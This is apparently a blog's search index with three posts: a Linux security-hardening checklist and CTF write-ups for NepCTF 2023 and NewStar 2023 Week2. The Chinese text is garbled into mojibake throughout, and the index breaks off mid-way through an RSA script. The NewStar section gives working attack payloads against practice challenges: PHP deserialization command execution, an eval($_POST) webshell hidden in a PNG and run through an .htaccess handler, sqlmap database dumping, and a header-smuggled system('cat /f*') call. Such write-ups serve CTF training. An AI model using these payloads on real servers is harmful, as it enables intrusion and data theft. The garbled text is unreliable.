[{"title":"Linuxå®‰å…¨åŸºçº¿æ£€æŸ¥åŠåŠ å›º","url":"/Linux%E5%AE%89%E5%85%A8%E5%9F%BA%E7%BA%BF%E6%A3%80%E6%9F%A5%E5%8F%8A%E5%8A%A0%E5%9B%BA/","content":"Linuxå®‰å…¨åŸºçº¿æ£€æŸ¥åŠåŠ å›ºç³»ç»ŸåŠ å›ºæ£€æŸ¥ç‚¹\nè´¦å·å®‰å…¨\nç©ºå£ä»¤ç”¨æˆ·\numaskå€¼çš„é‡è¦æ€§\nsuçš„é™åˆ¶\nå¯†ç æœ€é•¿æœ‰æ•ˆæœŸ\nå¯†ç å¤æ‚æ€§\n\n\nç³»ç»Ÿå®‰å…¨åŸºçº¿\næ£€æŸ¥grubå¯†ç \nä¿®æ”¹å†…æ ¸ç½‘ç»œå‚æ•°\nç¦æ­¢Control-Alt-Deleteé”®ç›˜å…³é—­å‘½ä»¤\nä¿®æ”¹å‘½ä»¤å†å²è®°å½•æ¡ç›®æ•°ä»¥åŠæ—¶é—´æ ‡ç­¾\nè®¾ç½®ç™»å½•è¶…æ—¶æ—¶é—´\n\n\n\nç©ºå£ä»¤ç”¨æˆ·\nåˆ©ç”¨cat /etc/shadowæŒ‡ä»¤ï¼Œä¸Šå›¾kaliåçš„ä¸ºç”¨æˆ·çš„å¯†ç ï¼ŒæŸ¥çœ‹ç”¨æˆ·æ˜¯å¦å­˜åœ¨ç©ºå£ä»¤ï¼Œä½†æ˜¯ï¼Œè¿™ç§æ–¹æ³•å®¹æ˜“çœ‹æ¼ç›¸å…³ä¿¡æ¯\n\nç©ºå£ä»¤å’Œéšè—ç®¡ç†å‘˜æ£€æŸ¥\n\n$1 ç”¨æˆ·å  $2 å¯†ç å ç”¨ç¬¦$3 UID$4 ç»„\n\n\nä½¿ç”¨å‘½ä»¤awk -F: &#39;($2==&quot;&quot;)&#123;print $1&#125;&#39; /etc/shadowæŸ¥çœ‹ç©ºå£ä»¤è´¦å·  $1ä¸ºç¬¬ä¸€ä¸ªå­—æ®µå³ç”¨æˆ·å\n\nä½¿ç”¨å‘½ä»¤awk -F: &#39;($3==0)&#123;print $1&#125;&#39; /etc/passwdæŸ¥çœ‹UIDä¸º0çš„è´¦å·\n\numaskå€¼çš„é‡è¦æ€§\numaskä½œç”¨ï¼šä¸»è¦æ˜¯é’ˆå¯¹æ–°åˆ›å»ºçš„æ–‡ä»¶çš„æƒé™ç®¡ç†ï¼Œæ¯”å¦‚ä½ umaskè®¾ç½®çš„æ˜¯022 é‚£ä½ åˆ›å»ºä¸€ä¸ªæ–°æ–‡ä»¶é»˜è®¤çš„æƒé™å°±æ˜¯644 (644çš„äºŒè¿›åˆ¶ 110 010 010)å±ä¸»è¯»å†™ åŒç»„è¯» å…¶ä»–ç”¨æˆ·è¯»\nrwx  &#x3D;&gt;  r&#x3D;read(è¯»å–) w&#x3D;write(å†™å…¥) x(exe)(æ‰§è¡Œ)\n\né™åˆ¶ç”¨æˆ·ä½¿ç”¨suä½¿ç”¨å‘½ä»¤vim /etc/pasm.d/su ä¿®æ”¹é…ç½®æ–‡ä»¶ï¼Œå»é™¤ç¬¬å…­è¡Œçš„æ³¨é‡Šç¬¦å·ï¼Œè¡¨ç¤ºåœ¨wheelç»„ä¸­çš„ç”¨æˆ·æ‰èƒ½å¤ŸæˆåŠŸä½¿ç”¨suå‘½ä»¤ï¼Œå…¶ä»–ç”¨æˆ·æ— æ³•ä½¿ç”¨ã€‚å¦‚æœéœ€è¦å…¶ä»–ç»„æ”¯æŒè¯¥åŠŸèƒ½å¯ä»¥æ·»åŠ å†…å®¹ã€‚\n\n\nä¾‹å¦‚ï¼šåªå…è®¸testç»„ç”¨æˆ·suåˆ°root\nauth required pam_wheel.so group=test\nå¯†ç æœ€é•¿æœ‰æ•ˆæœŸåœ¨æ–‡ä»¶/etc/login.defs ä¸­è¿›è¡Œè®¾ç½®å¦‚ä¸‹å‚æ•°\nPASS_MAX_DAYS   180  #å¯†ç æœ€é•¿è¿‡æœŸå¤©æ•°PASS_MIN_DAYS   30  #å¯†ç æœ€å°è¿‡æœŸå¤©æ•°PASS_MIN_LEN    12  #å¯†ç æœ€å°é•¿åº¦PASS_WARN_AGE   20   #å¯†ç è¿‡æœŸè­¦å‘Šå¤©æ•°\n\n\nå¯†ç å¤æ‚æ€§\næ–‡ä»¶ç¼–è¾‘\n/etc/pam.d/system-auth \nDebianç³»åˆ—ç³»ç»Ÿï¼š/etc/pam.d/common-password\n\n\n\nå¯†ç å†å²æˆ–æ‹’ç»é‡å¤ä½¿ç”¨å¯†ç æ˜¯ä»€ä¹ˆï¼Ÿè¿™ä¸ªå‚æ•°æ§åˆ¶å¯†ç å†å²ã€‚å®ƒè®°å½•æ›¾ç»ä½¿ç”¨è¿‡çš„å¯†ç ï¼ˆç¦æ­¢ä½¿ç”¨çš„æ›¾ç”¨å¯†ç çš„ä¸ªæ•°ï¼‰ã€‚å½“ç”¨æˆ·è®¾ç½®æ–°çš„å¯†ç æ—¶ï¼Œå®ƒä¼šæ£€æŸ¥å¯†ç å†å²ï¼Œå¦‚æœä»–ä»¬è¦è®¾ç½®çš„å¯†ç æ˜¯ä¸€ä¸ªæ›¾ç»ä½¿ç”¨è¿‡çš„æ—§å¯†ç ï¼Œå°†ä¼šå‘å‡ºè­¦å‘Šæç¤ºã€‚è¿™ä¸ªå‚æ•°å¯ä»¥åœ¨ /etc/pam.d/system-auth æ–‡ä»¶ä¸­è®¾ç½®ã€‚æˆ‘è®¾ç½®å¯†ç å†å²ä¸º 5ã€‚\n# vi /etc/pam.d/system-authpassword  sufficient  pam_unix.so md5 shadow nullok try_first_pass use_authtok remember=5\n\nå¯†ç æœ€å°é•¿åº¦æ˜¯ä»€ä¹ˆï¼Ÿè¿™ä¸ªå‚æ•°è¡¨ç¤ºå¯†ç çš„æœ€å°é•¿åº¦ã€‚å½“ç”¨æˆ·è®¾ç½®æ–°å¯†ç æ—¶ï¼Œç³»ç»Ÿä¼šæ£€æŸ¥è¿™ä¸ªå‚æ•°ï¼Œå¦‚æœæ–°è®¾çš„å¯†ç é•¿åº¦å°äºè¿™ä¸ªå‚æ•°è®¾ç½®çš„å€¼ï¼Œä¼šæ”¶åˆ°è­¦å‘Šæç¤ºã€‚è¿™ä¸ªå‚æ•°å¯ä»¥åœ¨ /etc/pam.d/system-auth æ–‡ä»¶ä¸­è®¾ç½®ã€‚æˆ‘è®¾ç½®æœ€å°å¯†ç é•¿åº¦ä¸º 12ã€‚\n# vi /etc/pam.d/system-authpassword  requisite   pam_cracklib.so try_first_pass retry=3 minlen=12\n\ntry_first_pass retry=3ï¼šåœ¨å¯†ç è®¾ç½®äº¤äº’ç•Œé¢ï¼Œç”¨æˆ·æœ‰ 3 æ¬¡æœºä¼šé‡è®¾å¯†ç ã€‚\nè®¾ç½®æœ€å°‘çš„å¤§å†™å­—æ¯ä¸ªæ•°ï¼Ÿè¿™ä¸ªå‚æ•°è¡¨ç¤ºå¯†ç ä¸­è‡³å°‘éœ€è¦çš„å¤§å†™å­—æ¯çš„ä¸ªæ•°ã€‚è¿™äº›æ˜¯å¯†ç å¼ºåº¦å‚æ•°ï¼Œå¯ä»¥è®©å¯†ç æ›´å¥å£®ã€‚å½“ç”¨æˆ·è®¾ç½®æ–°å¯†ç æ—¶ï¼Œç³»ç»Ÿä¼šæ£€æŸ¥è¿™ä¸ªå‚æ•°ï¼Œå¦‚æœå¯†ç ä¸­æ²¡æœ‰å¤§å†™å­—æ¯ï¼Œä¼šæ”¶åˆ°è­¦å‘Šæç¤ºã€‚è¿™ä¸ªå‚æ•°å¯ä»¥åœ¨ /etc/pam.d/system-auth æ–‡ä»¶ä¸­è®¾ç½®ã€‚æˆ‘è®¾ç½®å¯†ç ï¼ˆä¸­çš„å¤§å†™å­—æ¯ï¼‰çš„æœ€å°é•¿åº¦ä¸º 1 ä¸ªå­—æ¯ã€‚\n# vi /etc/pam.d/system-authpassword   requisite   pam_cracklib.so try_first_pass retry=3 minlen=12 ucredit=-1\n\nè®¾ç½®æœ€å°‘çš„å°å†™å­—æ¯ä¸ªæ•°ï¼Ÿè¿™ä¸ªå‚æ•°è¡¨ç¤ºå¯†ç ä¸­è‡³å°‘éœ€è¦çš„å°å†™å­—æ¯çš„ä¸ªæ•°ã€‚è¿™äº›æ˜¯å¯†ç å¼ºåº¦å‚æ•°ï¼Œå¯ä»¥è®©å¯†ç æ›´å¥å£®ã€‚å½“ç”¨æˆ·è®¾ç½®æ–°å¯†ç æ—¶ï¼Œç³»ç»Ÿä¼šæ£€æŸ¥è¿™ä¸ªå‚æ•°ï¼Œå¦‚æœå¯†ç ä¸­æ²¡æœ‰å°å†™å­—æ¯ï¼Œä¼šæ”¶åˆ°è­¦å‘Šæç¤ºã€‚è¿™ä¸ªå‚æ•°å¯ä»¥åœ¨ /etc/pam.d/system-auth æ–‡ä»¶ä¸­è®¾ç½®ã€‚æˆ‘è®¾ç½®ä¸º 1 ä¸ªå­—æ¯ã€‚\n# vi /etc/pam.d/system-authpassword    requisite     pam_cracklib.so try_first_pass retry=3 minlen=12 lcredit=-1\n\nè®¾ç½®å¯†ç ä¸­æœ€å°‘çš„æ•°å­—ä¸ªæ•°ï¼Ÿè¿™ä¸ªå‚æ•°è¡¨ç¤ºå¯†ç ä¸­è‡³å°‘éœ€è¦çš„æ•°å­—çš„ä¸ªæ•°ã€‚è¿™äº›æ˜¯å¯†ç å¼ºåº¦å‚æ•°ï¼Œå¯ä»¥è®©å¯†ç æ›´å¥å£®ã€‚å½“ç”¨æˆ·è®¾ç½®æ–°å¯†ç æ—¶ï¼Œç³»ç»Ÿä¼šæ£€æŸ¥è¿™ä¸ªå‚æ•°ï¼Œå¦‚æœå¯†ç ä¸­æ²¡æœ‰æ•°å­—ï¼Œä¼šæ”¶åˆ°è­¦å‘Šæç¤ºã€‚è¿™ä¸ªå‚æ•°å¯ä»¥åœ¨ /etc/pam.d/system-auth æ–‡ä»¶ä¸­è®¾ç½®ã€‚æˆ‘è®¾ç½®ä¸º 1 ä¸ªæ•°å­—ã€‚\n# vi /etc/pam.d/system-authpassword    requisite     pam_cracklib.so try_first_pass retry=3 minlen=12 dcredit=-1\n\nè®¾ç½®å¯†ç ä¸­æœ€å°‘çš„å…¶ä»–å­—ç¬¦ï¼ˆç¬¦å·ï¼‰ä¸ªæ•°ï¼Ÿè¿™ä¸ªå‚æ•°è¡¨ç¤ºå¯†ç ä¸­è‡³å°‘éœ€è¦çš„ç‰¹æ®Šç¬¦å·çš„ä¸ªæ•°ã€‚è¿™äº›æ˜¯å¯†ç å¼ºåº¦å‚æ•°ï¼Œå¯ä»¥è®©å¯†ç æ›´å¥å£®ã€‚å½“ç”¨æˆ·è®¾ç½®æ–°å¯†ç æ—¶ï¼Œç³»ç»Ÿä¼šæ£€æŸ¥è¿™ä¸ªå‚æ•°ï¼Œå¦‚æœå¯†ç ä¸­æ²¡æœ‰ç‰¹æ®Šç¬¦å·ï¼Œä¼šæ”¶åˆ°è­¦å‘Šæç¤ºã€‚è¿™ä¸ªå‚æ•°å¯ä»¥åœ¨ /etc/pam.d/system-auth æ–‡ä»¶ä¸­è®¾ç½®ã€‚æˆ‘è®¾ç½®ä¸º 1 ä¸ªå­—ç¬¦ã€‚\n# vi /etc/pam.d/system-authpassword    requisite     pam_cracklib.so try_first_pass retry=3 minlen=12 ocredit=-1\n\nè®¾ç½®è´¦å·é”å®šï¼Ÿè¿™ä¸ªå‚æ•°æ§åˆ¶ç”¨æˆ·è¿ç»­ç™»å½•å¤±è´¥çš„æœ€å¤§æ¬¡æ•°ã€‚å½“è¾¾åˆ°è®¾å®šçš„è¿ç»­å¤±è´¥ç™»å½•æ¬¡æ•°é˜ˆå€¼æ—¶ï¼Œé”å®šè´¦å·ã€‚è¿™ä¸ªå‚æ•°å¯ä»¥åœ¨ /etc/pam.d/system-auth æ–‡ä»¶ä¸­è®¾ç½®ã€‚\n# vi /etc/pam.d/system-authauth        required      pam_tally2.so onerr=fail audit silent deny=5account required pam_tally2.so\n\nè®¾å®šè´¦å·è§£é”æ—¶é—´ï¼Ÿè¿™ä¸ªå‚æ•°è¡¨ç¤ºç”¨æˆ·è§£é”æ—¶é—´ã€‚å¦‚æœä¸€ä¸ªç”¨æˆ·è´¦å·åœ¨è¿ç»­è®¤è¯å¤±è´¥åè¢«é”å®šäº†ï¼Œå½“è¿‡äº†è®¾å®šçš„è§£é”æ—¶é—´åï¼Œæ‰ä¼šè§£é”ã€‚è®¾ç½®è¢«é”å®šä¸­çš„è´¦å·çš„è§£é”æ—¶é—´ï¼ˆ900 ç§’ &#x3D; 15åˆ†é’Ÿï¼‰ã€‚è¿™ä¸ªå‚æ•°å¯ä»¥åœ¨ /etc/pam.d/system-auth æ–‡ä»¶ä¸­è®¾ç½®ã€‚\n# vi /etc/pam.d/system-authauth        required      pam_tally2.so onerr=fail audit silent deny=5 unlock_time=900account required pam_tally2.so\n\næ¥æº:https://linux.cn/\næ£€æŸ¥grubå¯†ç å¼±å£ä»¤é˜²èŒƒï¼Œæš´åŠ›ç ´è§£é˜²å¾¡\nè®¾ç½®è¿ç»­è¾“é”™3æ¬¡å¯†ç ï¼Œè´¦å·é”å®š3åˆ†é’Ÿ(kali æ²¡æœ‰è¿™ä¸¤ä¸ªæ–‡ä»¶)\n\næ–‡ä»¶ç¼–è¾‘\n\n/etc/pam.d/system-auth\n/etc/pam.d/password-auth\n\n\né…ç½®å†…å®¹ï¼Œåœ¨æºæ–‡ä»¶ç¬¬ä¸€è¡Œä¸‹é…ç½®å¦‚ä¸‹ä¸¤è¡Œ\n\nauth required pam_tally2.so deny=3 unlock time=30 enven_deny_root root_unlock_time=30\n\naccount required pam_tally2.so\n\n\n\n\n","categories":["åŸºçº¿æ£€æŸ¥","Linux"],"tags":["åŸºçº¿æ£€æŸ¥","Linuxå®‰å…¨åŸºçº¿","å®‰å…¨åŸºçº¿åŠ å›º"]},{"title":"NepCTF 2023","url":"/NepCTF-2023/","content":"ä¸AIå…±èˆçš„å“ˆå¤«æ›¼\n\nä¸‹è½½æ–‡ä»¶ æºç \n\nimport heapqimport osclass HuffmanNode:    def __init__(self, char, freq):        self.char = char        self.freq = freq        self.left = None        self.right = None    def __lt__(self, other):        return self.freq &lt; other.freqdef build_huffman_tree(frequencies):    heap = [HuffmanNode(char, freq) for char, freq in frequencies.items()]    heapq.heapify(heap)    while len(heap) &gt; 1:        left = heapq.heappop(heap)        right = heapq.heappop(heap)        merged = HuffmanNode(None, left.freq + right.freq)        merged.left = left        merged.right = right        heapq.heappush(heap, merged)    return heap[0]def build_huffman_codes(node, current_code, huffman_codes):    if node is None:        return    if node.char is not None:        huffman_codes[node.char] = current_code        return    build_huffman_codes(node.left, current_code + &#x27;0&#x27;, huffman_codes)    build_huffman_codes(node.right, current_code + &#x27;1&#x27;, huffman_codes)def compress(input_file, output_file):    with open(input_file, &#x27;rb&#x27;) as f:        data = f.read()    frequencies = &#123;&#125;    for byte in data:        if byte not in frequencies:            frequencies[byte] = 0        frequencies[byte] += 1    root = build_huffman_tree(frequencies)    huffman_codes = &#123;&#125;    build_huffman_codes(root, &#x27;&#x27;, huffman_codes)    compressed_data = &#x27;&#x27;    for byte in data:        compressed_data += huffman_codes[byte]    padding = 8 - len(compressed_data) % 8    compressed_data += &#x27;0&#x27; * padding    with open(output_file, &#x27;wb&#x27;) as f:        # Write frequency information        f.write(bytes([len(frequencies)]))        for byte, freq in frequencies.items():            f.write(bytes([byte, (freq &gt;&gt; 24) &amp; 0xFF, (freq &gt;&gt; 16) &amp; 0xFF, (freq &gt;&gt; 8) &amp; 0xFF, freq &amp; 0xFF]))        # Write compressed data        for i in range(0, len(compressed_data), 8):            byte = compressed_data[i:i+8]            f.write(bytes([int(byte, 2)]))if __name__ == &quot;__main__&quot;:    input_file = &#x27;input.txt&#x27;    compressed_file = &#x27;compressed.bin&#x27;    decompressed_file = &#x27;decompressed.txt&#x27;    # å‹ç¼©æ–‡ä»¶    compress(input_file, compressed_file)    # è§£å‹ç¼©æ–‡ä»¶    decompress(compressed_file, decompressed_file)\n\n\nè§‚å¯Ÿæºç å‘ç° ç¼ºå°‘è§£å‹ç¼©å‡½æ•° ç¼–å†™è§£å‹ç¼©å‡½æ•°\n\ndef decompress(input_file, output_file):    # è¯»å–å‹ç¼©æ–‡ä»¶ä¸­çš„æ•°æ®    with open(input_file, &#x27;rb&#x27;) as f:        compressed_data = f.read()        # print(compressed_data)    # è¯»å–é¢‘ç‡ä¿¡æ¯    num_symbols = compressed_data[0]    # print(num_symbols)    frequencies = &#123;&#125;    index = 1    for _ in range(num_symbols):        symbol = compressed_data[index]        # print(symbol)        freq = (compressed_data[index + 1] &lt;&lt; 24) | (compressed_data[index + 2] &lt;&lt; 16) | (compressed_data[index + 3] &lt;&lt; 8) | compressed_data[index + 4]        frequencies[symbol] = freq        index += 5    # é‡å»º Huffman æ ‘    root = build_huffman_tree(frequencies)    # è§£å‹ç¼©æ•°æ®    current_node = root    decompressed_data = []    for byte in compressed_data[index:]:        byte_value = int(byte)        for i in range(7, -1, -1):            bit = (byte_value &gt;&gt; i) &amp; 1            if bit == 0:                current_node = current_node.left            else:                current_node = current_node.right            if current_node.char is not None:                decompressed_data.append(current_node.char)                current_node = root    # å°†è§£å‹ç¼©åçš„æ•°æ®å†™å…¥æ–‡ä»¶    with open(output_file, &#x27;wb&#x27;) as f:        f.write(bytes(decompressed_data))\n\n\nè¿è¡Œä»£ç å¾—åˆ°decompressed.txt\n\n\ncodes\n\nè¿›å…¥è®¿é—®é¡µé¢åï¼š\n\n\n\n\nè§‚å¯Ÿå¾—åˆ° éœ€è¦è¾“å…¥Cè¯­è¨€ä»£ç ï¼Œè¾“å…¥systemåæ²¡æœ‰æ­£å¸¸æ˜¾ç¤ºï¼ŒçŒœæµ‹å¯èƒ½æ˜¯è¢«è¿‡æ»¤äº†\n\näºæ˜¯é€šè¿‡argv ç›´æ¥æ‰“å°å‘½ä»¤è¡Œå‚æ•°\n\n\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(int argc, char **argv) &#123;    // æ‰“å°å‘½ä»¤è¡Œå‚æ•°    printf(&quot;Command line arguments:\\n&quot;);    for (int i = 0; i &lt; 20; i++) &#123;        printf(&quot;argv[%d]: %s\\n&quot;, i, argv[i]);    &#125;    return 0;&#125;\n\n\n","categories":["CTF","NepCTF 2023"],"tags":["ctf","misc"]},{"title":"NewStar 2023 Week2","url":"/NewStar-WriteUp-Week2/","content":"NewStar 2023 Week2WEBæ¸¸æˆé«˜æ‰‹\n\næ‰“å¼€é¢˜ç›®çœ‹åˆ°ä¸Šè¿°ï¼Œæ˜¾ç„¶ä¸å¯èƒ½ç©åˆ°100000åˆ†ï¼Œé¦–å…ˆbpæŠ“åŒ…çœ‹çœ‹æœ‰ä»€ä¹ˆå‘ç°\n\n\n\nä¼¼ä¹æ²¡æœ‰ä»€ä¹ˆæœ‰ç”¨ä¿¡æ¯ï¼ŒæŸ¥çœ‹æºä»£ç ï¼Œå¥½åƒæœ‰æœ‰ç”¨ä¿¡æ¯app_v2.js jsæ–‡ä»¶\n\n\n\næŸ¥çœ‹jsæ–‡ä»¶äºæ˜¯æœ‰äº†æƒ³æ³•ï¼šæ˜¯å¦å¯ä»¥ç›´æ¥ä¿®æ”¹åŸå§‹çš„åˆ†æ•°\n\n\n\nè°ƒè¯•å™¨ï¼Œåœ¨20è¡Œè®¾ç½®æ–­ç‚¹ï¼ŒF5åˆ·æ–°åï¼Œåœ¨æ§åˆ¶å°è¾“å…¥ï¼šgameScore = 100000\n\n\n\næ¥ç€è¿”å›è°ƒè¯•å™¨ï¼Œå¯ä»¥çœ‹åˆ°æ­¤æ—¶çš„gameScoreçš„å€¼ä¸º100000\n\n\n\næ¥ç€F8,è®©jsä»£ç é¡ºåˆ©æ‰§è¡Œï¼Œè¿›å…¥æ¸¸æˆä¼šå‘ç°åŸå§‹åˆ†å˜æˆäº†100000ï¼Œç»“æŸæ¸¸æˆå³å¯å¾—åˆ°flag\n\n\ninclude 0ã€‚0\næ‰“å¼€å°±çœ‹åˆ°æºç \n\n &lt;?phphighlight_file(__FILE__);// Maybe you need learn some knowledge about deserialize?class evil &#123;    private $cmd;    public function __destruct()    &#123;        if(!preg_match(&quot;/cat|tac|more|tail|base/i&quot;, $this-&gt;cmd))&#123;            @system($this-&gt;cmd);        &#125;    &#125;&#125;@unserialize($_POST[&#x27;unser&#x27;]);?&gt; \n\n\nå‘ç°è¿‡æ»¤äº†baseå’Œrot ï¼Œä½†æ˜¯è¿˜æœ‰å…¶ä»–ä¸€äº›è¿‡æ»¤å™¨å¯ä»¥ç”¨\næ„é€ payloadï¼šphp://filter//convert.iconv.SJIS*.UCS-4*/resource=flag.php\n\n\n\næˆåŠŸæ‹¿åˆ°flagflag&#123;670e28dc-940b-4d66-92ec-40be4a0ae771&#125;\n\nez_sql\nçœ‹åˆ°é¢˜ç›®ï¼Œè‚¯å®šæ˜¯sqlæ³¨å…¥ç›¸å…³çš„ï¼Œç›´æ¥sqlmapæ‰«æ\nsqlmap -u &quot;http://a53134e7-8ebc-46e4-bc62-ac46e2b91837.node4.buuoj.cn:81/?id=TMP11503&quot; --dbs  \n\n\n\n\nç›´æ¥ä½¿ç”¨ --dump,åˆ—å‡ºæ‰€æœ‰çš„è¡¨æ•°æ®\n\n\n\nâ€‹\tflag&#123;ae2227f2-2ea1-4cd8-84b7-ad1d21cda25d&#125;\nUnserialize?\næ‰“å¼€çœ‹åˆ°æºç \n\n &lt;?phphighlight_file(__FILE__);// Maybe you need learn some knowledge about deserialize?class evil &#123;    private $cmd;    public function __destruct()    &#123;        if(!preg_match(&quot;/cat|tac|more|tail|base/i&quot;, $this-&gt;cmd))&#123;            @system($this-&gt;cmd);        &#125;    &#125;&#125;@unserialize($_POST[&#x27;unser&#x27;]);?&gt; \n\n\nå‘ç°åªéœ€è¦è®¾ç½®evilç±»ä¸­cmdæˆå‘˜çš„å€¼ç„¶åååºåˆ—åŒ–è§¦å‘__destructææ„å‡½æ•°å³å¯è§¦å‘RCE\n\nå‘ç°è¿‡æ»¤äº†cat|tac|more|tail|baseï¼Œä½†æ˜¯å¯ä»¥ç”¨ls æŸ¥çœ‹ç›®å½•ï¼Œæ„é€ payload\n\n\n&lt;?phpclass evil&#123;    public $cmd = &#x27;ls&#x27;;&#125;$e = new evil();echo urlencode(serialize($e));?&gt;        # è¿è¡Œç»“æœ  O%3A4%3A%22evil%22%3A1%3A%7Bs%3A3%3A%22cmd%22%3Bs%3A2%3A%22ls%22%3B%7D\n\n\n\nå‘ç°å½“å‰ç›®å½•åªæœ‰index.php,äºæ˜¯æŸ¥çœ‹æ ¹ç›®å½•\n\n&lt;?phpclass evil&#123;    public $cmd = &#x27;ls /&#x27;;&#125;$e = new evil();echo urlencode(serialize($e));?&gt;    # è¿è¡Œç»“æœ  O%3A4%3A%22evil%22%3A1%3A%7Bs%3A3%3A%22cmd%22%3Bs%3A4%3A%22ls+%2F%22%3B%7D\n\n\néœ€è¦æ³¨æ„çš„æ˜¯è¿è¡Œç»“æœä¸­æœ‰ + éœ€è¦å°†+æ”¹æˆ%20ï¼Œå¾—åˆ°æ ¹ç›®å½•\n\n\næ‰¾åˆ°å¯ç–‘ç›®å½•th1s_1s_fffflllll4444aaaggggg,ä½†æ˜¯catè¢«è¿‡æ»¤ï¼Œæƒ³åŠæ³•ç»•è¿‡\n\n\n&lt;?phpclass evil&#123;    public $cmd = &#x27;ca``t th1s_1s_fffflllll4444aaaggggg&#x27;;&#125;$e = new evil();echo urlencode(serialize($e));?&gt;    # è¿è¡Œç»“æœ O%3A4%3A%22evil%22%3A1%3A%7Bs%3A3%3A%22cmd%22%3Bs%3A36%3A%22ca%60%60t+%2Fth1s_1s_fffflllll4444aaaggggg%22%3B%7D\n\n\nUpload again!\n\né¦–å…ˆåˆ©ç”¨bpæŠ“åŒ…è¯•è¯•ï¼Œæ­£å¸¸ä¸Šä¼ å›¾ç‰‡æ­£å¸¸å›æ˜¾\n\n\nå°†å›¾ç‰‡åç¼€æ›´æ”¹ä¸ºphpï¼Œæ˜¾ç¤ºé”™è¯¯\n\n\nè¯•ç€ä¸Šä¼ å›¾ç‰‡é©¬ï¼Œè¿˜æ˜¯èƒ½æ£€æµ‹å‡ºæ¥\n\n\nçŒœæµ‹å¯èƒ½æ˜¯æ£€æµ‹äº†åç¼€ï¼Œä»¥åŠæ£€æµ‹å›¾ç‰‡å†…å®¹ä¸­æ˜¯å¦åŒ…å«äº†phpä»£ç ï¼Œè¯•ç€å»æ‰phpä»£ç \n\n\nä»ç„¶è¢«æ£€æµ‹å‡ºæ¥ï¼Œç°åœ¨çŒœæµ‹å¯èƒ½æ˜¯ç”±äº&lt;? ?&gt;ï¼Œå»æ‰&lt;? ?&gt;,ä¿ç•™phpä¸­çš„ä»£ç ï¼Œå‘ç°èƒ½æˆåŠŸä¸Šä¼ \n\n\nåˆ©ç”¨scriptä»£æ›¿æ ‡ç­¾\n&lt;script language=&quot;php&quot;&gt;@eval($_POST[&#x27;111111&#x27;]);&lt;/script&gt;\n\n\nä½†æ˜¯ï¼Œå›¾ç‰‡ä¸­çš„phpä»£ç ä¸èƒ½è¢«è§£æï¼Œå°è¯•å…ˆä¸Šä¼ .htaccessæ–‡ä»¶ï¼Œåœ¨ä¸Šä¼ å¯¹åº”å›¾ç‰‡ï¼Œè¿™æ ·å›¾ç‰‡ä¸­çš„phpä»£ç å°±èƒ½è¢«è§£æ\n&lt;FilesMatch &quot;evil.png&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt;\n\n\n\næ¥ç€ä¸Šä¼  evil.pngæ–‡ä»¶\n\n\næ¥ç€ç”¨èšå‰‘è¿æ¥ï¼ŒæŸ¥è¯¢å¯ç–‘æ–‡ä»¶\n\n\n\nflag&#123;4366f19d-3ec5-4dec-801f-113d944e370a&#125;\nR!!C!!E!!æ ¹æ®æç¤ºæœ‰ä¿¡æ¯æ³„éœ²ï¼Œå¯ä»¥ä½¿ç”¨dirsearchæ‰«ï¼Œæ‰«å‡ºäº† &#x2F;.git\nä½¿ç”¨githackå·¥å…·è·å–æºç \n\nbo0g1pop.phpæºç ï¼š\n&lt;?phphighlight_file(__FILE__);if (&#x27;;&#x27; === preg_replace(&#x27;/[^\\W]+\\((?R)?\\)/&#x27;, &#x27;&#x27;, $_GET[&#x27;star&#x27;])) &#123;    if(!preg_match(&#x27;/high|get_defined_vars|scandir|var_dump|read|file|php|curent|end/i&#x27;,$_GET[&#x27;star&#x27;]))&#123;        eval($_GET[&#x27;star&#x27;]);    &#125;&#125;\n\næ ¹æ®æç¤ºç»•è¿‡ä¸¤å¤„æ­£åˆ™ï¼š\n\nç¬¬ä¸€ä¸ªæ­£åˆ™å¯¹æäº¤çš„å‚æ•°è¿›è¡Œå¤„ç†ï¼šä»»æ„å­—ç¬¦åŠ ä¸Šå¯é€‰çš„æ‹¬å·ï¼ˆå…è®¸åµŒå¥—ï¼‰æ›´æ¢ä¸ºç©ºï¼Œç„¶ååˆ¤æ–­æ˜¯å¦ç­‰äºåˆ†å·ï¼Œç»“åˆä¸‹é¢çš„ eval å¯ä»¥çŸ¥é“å°±æ˜¯æ— å‚æ•°å‘½ä»¤æ‰§è¡Œã€‚\nç¬¬äºŒä¸ªæ­£åˆ™è¿‡æ»¤äº†ä¸€äº›å¸¸ç”¨çš„ç”¨äºæ— å‚æ•°å‘½ä»¤æ‰§è¡Œçš„ php æ–¹æ³•ï¼Œä½†è¿‡æ»¤ä¸å…¨ï¼Œå¯ä»¥ä½¿ç”¨ç±»ä¼¼åŠŸèƒ½çš„æ–¹æ³•è¿›è¡Œç»•è¿‡ï¼Œæœ€ç»ˆå‘½ä»¤æ‰§è¡Œã€‚\n\nå®˜æ–¹payloadï¼ˆä½¿ç”¨ bp å‘é€çš„è¯·æ±‚ï¼‰ï¼š\nGET /bo0g1pop.php?star=eval(pos(array_reverse(getallheaders()))); HTTP/1.1Host: faf83665-1a88-473a-b765-ddd33c6cf370.node4.buuoj.cn:81User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeX-Forwarder-Proto: system(&#x27;cat /f*&#x27;);Upgrade-Insecure-Requests: 1\n\næœ‰ä¸€ç¯‡writeupå†™çš„å¾ˆå¥½ï¼šhttps://www.cnblogs.com/EddieMurphy-blogs/articles/17752305.html\nCryptoæ»´å•¤\næ ¹æ®æç¤º åº”è¯¥è€ƒå¯Ÿçš„æ˜¯RSA dpæ³„éœ²\n\n\nçœ‹åˆ°æ³¨é‡Šçš„ä¸‰æ¡æ•°æ®ï¼Œå¤§æ¦‚ç‡å°±æ˜¯dpæ³„éœ²ï¼Œç¼–å†™dpæ³„éœ²è„šæœ¬\n\n\nimport gmpy2import libnumn= 93172788492926438327710592564562854206438712390394636149385608321800134934361353794206624031396988124455847768883785503795521389178814791213054124361007887496351504099772757164211666778414800698976335767027868761735533195880182982358937211282541379697714874313863354097646233575265223978310932841461535936931e= 65537c= 52777705692327501332528487168340175436832109866218597778822262268417075157567880409483079452903528883040715097136293765188858187142103081639134055997552543213589467751037524482578093572244313928030341356359989531451789166815462417484822009937089058352982739611755717666799278271494933382716633553199739292089dp= 